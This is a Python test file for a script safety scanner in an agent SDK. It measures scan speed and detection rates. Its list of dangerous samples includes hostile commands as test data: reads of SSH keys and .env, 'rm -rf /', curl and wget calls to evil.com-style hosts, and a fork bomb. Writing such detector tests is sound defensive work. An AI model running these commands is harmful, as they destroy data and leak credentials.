# Tencent is pleased to support the open source community by making tRPC-Agent-Python available.
#
# Copyright (C) 2026 Tencent. All rights reserved.
#
# tRPC-Agent-Python is licensed under Apache-2.0.
"""Performance and detection-rate verification tests for the safety guard."""

from __future__ import annotations

import time

from trpc_agent_sdk.tools.safety import Decision
from trpc_agent_sdk.tools.safety import PolicyConfig
from trpc_agent_sdk.tools.safety import SafetyScanner
from trpc_agent_sdk.tools.safety import ScanRequest
from trpc_agent_sdk.tools.safety import ScriptLanguage


def _generate_500_lines(language: str) -> str:
    """Generate a 500-line safe script."""
    lines = []
    for i in range(500):
        if language == "python":
            if i % 5 == 0:
                lines.append(f"# Comment {i}")
            elif i % 5 == 1:
                lines.append(f"x_{i} = {i} + {i % 10}")
            elif i % 5 == 2:
                lines.append(f"print(f'Item {{x_{i}}}')")
            elif i % 5 == 3:
                lines.append(f"result_{i} = [j * 2 for j in range(x_{i})]")
            else:
                lines.append(f"assert isinstance(x_{i}, int)")
        else:
            if i % 5 == 0:
                lines.append(f"# Comment {i}")
            elif i % 5 == 1:
                lines.append(f'echo "Step {i}"')
            elif i % 5 == 2:
                lines.append(f"VAR_{i}=value_{i}")
            elif i % 5 == 3:
                lines.append(f'[ -n "$VAR_{i}" ] && echo "$VAR_{i}"')
            else:
                lines.append("sleep 0.01")
    return "\n".join(lines)


class TestScanPerformance:

    def test_500_line_python_under_1s(self):
        """500-line Python script scans in under 1 second."""
        script = _generate_500_lines("python")
        scanner = SafetyScanner(PolicyConfig.default())
        req = ScanRequest(script=script, language=ScriptLanguage.PYTHON, tool_name="perf_test")
        # Warm-up
        scanner.scan(req)
        # Measure
        start = time.monotonic()
        scanner.scan(req)
        elapsed_ms = int((time.monotonic() - start) * 1000)
        assert elapsed_ms <= 1000, f"500-line Python scan took {elapsed_ms}ms (limit 1000ms)"

    def test_500_line_bash_under_1s(self):
        """500-line Bash script scans in under 1 second."""
        script = _generate_500_lines("bash")
        scanner = SafetyScanner(PolicyConfig.default())
        req = ScanRequest(script=script, language=ScriptLanguage.BASH, tool_name="perf_test")
        # Warm-up
        scanner.scan(req)
        # Measure
        start = time.monotonic()
        scanner.scan(req)
        elapsed_ms = int((time.monotonic() - start) * 1000)
        assert elapsed_ms <= 1000, f"500-line Bash scan took {elapsed_ms}ms (limit 1000ms)"


class TestDetectionRates:

    # --- Samples that must be detected (DENY or NEEDS_HUMAN_REVIEW) ---
    DANGEROUS_SAMPLES: list[tuple[str, str, str]] = [
        # (label, script, language)
        # Credential reads — 100% required
        ("cred_cat_ssh", "cat ~/.ssh/id_rsa", "bash"),
        ("cred_cat_env", "cat .env", "bash"),
        ("cred_open_ssh_py", "open(os.path.expanduser('~/.ssh/id_rsa'))", "python"),
        # Dangerous deletes — 100% required
        ("del_rm_rf_root", "rm -rf /", "bash"),
        ("del_rm_rf_home", "rm -rf ~/", "bash"),
        ("del_rmtree_py", "import shutil\nshutil.rmtree('/tmp/danger')", "python"),
        # Non-whitelist network — 100% required
        ("net_curl_evil", "curl https://evil.com/data", "bash"),
        ("net_wget_evil", "wget https://malware.example.com/payload", "bash"),
        ("net_requests_evil_py", "import requests\nrequests.get('https://evil.com')", "python"),
        # Other dangerous
        ("sys_subprocess_py", "import subprocess\nsubprocess.run(['ls'])", "python"),
        ("sys_os_system_py", "import os\nos.system('ls')", "python"),
        ("sys_sudo", "sudo rm /tmp/file", "bash"),
        ("dep_pip", "pip install requests", "bash"),
        ("res_while_true_py", "while True:\n    pass", "python"),
        ("res_fork_bomb", ":(){ :|:& };:", "bash"),
        ("sec_echo_token", "echo $API_TOKEN", "bash"),
        ("sys_eval_py", "eval('1+1')", "python"),
        ("sys_getattr_py", "getattr(__builtins__, 'eval')('1+1')", "python"),
        ("alias_os_system_py", "from os import system\nsystem('ls')", "python"),
    ]

    # --- Samples that should pass (ALLOW) ---
    SAFE_SAMPLES: list[tuple[str, str, str]] = [
        ("safe_print", "print('hello world')", "python"),
        ("safe_math", "x = 1 + 2\nprint(x)", "python"),
        ("safe_echo", "echo hello", "bash"),
        ("safe_ls", "ls -la /tmp", "bash"),
        ("safe_cat", "cat /tmp/foo.txt", "bash"),
        ("safe_mkdir", "mkdir -p /tmp/foo", "bash"),
        ("safe_pytest", "def test_func():\n    assert True", "python"),
        ("safe_list_comp", "squares = [x**2 for x in range(10)]", "python"),
        ("safe_dict_ops", "d = {'a': 1}\nd['b'] = 2\nprint(d)", "python"),
    ]

    def test_high_risk_detection_rate(self):
        """High-risk detection rate >= 90%."""
        scanner = SafetyScanner(PolicyConfig.default())
        detected = 0
        for label, script, lang in self.DANGEROUS_SAMPLES:
            lang_enum = ScriptLanguage.PYTHON if lang == "python" else ScriptLanguage.BASH
            report = scanner.scan(ScanRequest(script=script, language=lang_enum, tool_name=label))
            if report.decision != Decision.ALLOW:
                detected += 1
        rate = detected / len(self.DANGEROUS_SAMPLES) * 100
        assert rate >= 90, f"Detection rate {rate:.1f}% below 90% threshold"

    def test_safe_sample_false_positive_rate(self):
        """Safe sample false positive rate <= 10%."""
        policy = PolicyConfig.default()
        policy.allowed_commands = []  # disable command whitelist to test safety rules only
        scanner = SafetyScanner(policy)
        fp = 0
        for label, script, lang in self.SAFE_SAMPLES:
            lang_enum = ScriptLanguage.PYTHON if lang == "python" else ScriptLanguage.BASH
            report = scanner.scan(ScanRequest(script=script, language=lang_enum, tool_name=label))
            if report.decision != Decision.ALLOW:
                fp += 1
        rate = fp / len(self.SAFE_SAMPLES) * 100
        assert rate <= 10, f"False positive rate {rate:.1f}% above 10% threshold"

    def test_credential_read_detection_100(self):
        """Credential file access: 100% detection."""
        samples = [s for s in self.DANGEROUS_SAMPLES if s[0].startswith("cred_")]
        scanner = SafetyScanner(PolicyConfig.default())
        for label, script, lang in samples:
            lang_enum = ScriptLanguage.PYTHON if lang == "python" else ScriptLanguage.BASH
            report = scanner.scan(ScanRequest(script=script, language=lang_enum, tool_name=label))
            assert report.decision != Decision.ALLOW, f"{label} not detected"

    def test_dangerous_delete_detection_100(self):
        """Dangerous file deletion: 100% detection."""
        samples = [s for s in self.DANGEROUS_SAMPLES if s[0].startswith("del_")]
        scanner = SafetyScanner(PolicyConfig.default())
        for label, script, lang in samples:
            lang_enum = ScriptLanguage.PYTHON if lang == "python" else ScriptLanguage.BASH
            report = scanner.scan(ScanRequest(script=script, language=lang_enum, tool_name=label))
            assert report.decision != Decision.ALLOW, f"{label} not detected"

    def test_non_whitelist_network_detection_100(self):
        """Non-whitelist network access: 100% detection."""
        samples = [s for s in self.DANGEROUS_SAMPLES if s[0].startswith("net_")]
        scanner = SafetyScanner(PolicyConfig.default())
        for label, script, lang in samples:
            lang_enum = ScriptLanguage.PYTHON if lang == "python" else ScriptLanguage.BASH
            report = scanner.scan(ScanRequest(script=script, language=lang_enum, tool_name=label))
            assert report.decision != Decision.ALLOW, f"{label} not detected"
